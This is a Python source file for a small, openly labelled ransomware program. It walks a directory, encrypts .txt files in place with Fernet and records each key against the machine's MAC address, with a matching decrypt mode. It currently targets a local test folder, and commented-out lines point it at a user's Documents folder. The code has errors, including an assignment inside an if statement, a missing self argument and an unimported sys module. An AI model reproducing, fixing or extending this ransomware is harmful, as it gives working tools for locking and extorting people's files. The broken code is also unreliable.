
from cryptography.fernet import Fernet 
import os
import getpass
import argparse
import socket
import uuid
from uuid import getnode as get_mac
import KeyManager


class Ransom:

    def __init__(self, key = None, targets = None, root = None):
        # TOdO
        if key != None:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.targets = ['txt']
        if root == None:
            self.root = self.getDefaultRoot()
        else:
            self.root = root
        
        self.keyManager = KeyManager()
    
    def getDefaultRoot():
        path = os.path.realpath('ransom.py')
        parts = path.split('/')
        path = '/'.join(parts[:-1])
        path+='/testDIr/'
        return path

    def encrypt(self):
        for root, dirs, files in os.walk(self.root):
            for file in files:
                filePath = os.path.join(root, file)
                if filePath.split('.')[-1] in self.targets:
                    self.encryptFile(filePath)
            #for name in dirs:
               # print(os.path.join(root, name))
        self.keyManager.insertKey(get_mac(), self.key)

    def encryptFile(self, file):
        with open(file, 'rb+') as f:
            content = f.read()
            encryptedContent = self.fernet.encrypt(content)
            f.seek(0) ## So we overwrite it
            f.write(encryptedContent)
            f.truncate()

    def startDecryption(self):
        if self.key = '':
            raise ValueError('The key is empty. Cannot decrypt without a key')
            print('No key') ### TODO díla við þetta
            return 
        
        self.decrypt()
    
    def decrypt(self):
        for root, dirs, files in os.walk(self.root):
            for file in files:
                filePath = os.path.join(root, file)
                if filePath.split('.')[-1] in self.targets:
                    self.decryptFile(filePath)
            
        
    def decryptFile(self, file):
        with open(file, 'rb+') as f:
            content = f.read()
            decryptedContent = self.fernet.decrypt(content)
            f.seek(0) ## So we overwrite it
            f.write(decryptedContent)
            f.truncate()
    

def main():
    ransom = Ransom()
    path = os.path.realpath('ransom.py')
    parts = path.split('/')
    path = '/'.join(parts[:-1])
    path+='/testDIr/'
    print(path)
    #doc_index = parts.index('Documents')
    #path = '/'.join(parts[:doc_index+1])
    #print(path)
    ransom = Ransom(root = path)
    ransom.encrypt()



parser = argparse.ArgumentParser(description='Ransomware >:(')
parser.add_argument('-e', help="Te key for encryption", action='store_true', dest="enc")
parser.add_argument('-d', help="The key for encryption", action='store_true',dest="dec")
parser.add_argument('-k', '--key', help ='Crypto key')
args = parser.parse_args()

enc = args.enc
dec = args.dec
key = args.key

if enc and dec:
    print('Can not both encrypt and decrypt at the same time.')
    sys.exit(0)

path = os.path.realpath('ransom.py')
parts = path.split('/')
path = '/'.join(parts[:-1])
path+='/testDIr/'
print(path)
if dec:
    
    #doc_index = parts.index('Documents')
    #path = '/'.join(parts[:doc_index+1])
    #print(path)
    ransom = Ransom(key = key, root = path)
    ransom.decrypt()

else: #Encrypt is default
    ransom = Ransom(key = key, root = path)
    print(ransom.key)
    ransom.encrypt()

#if __name__ == '__main__':
    #main()


        

    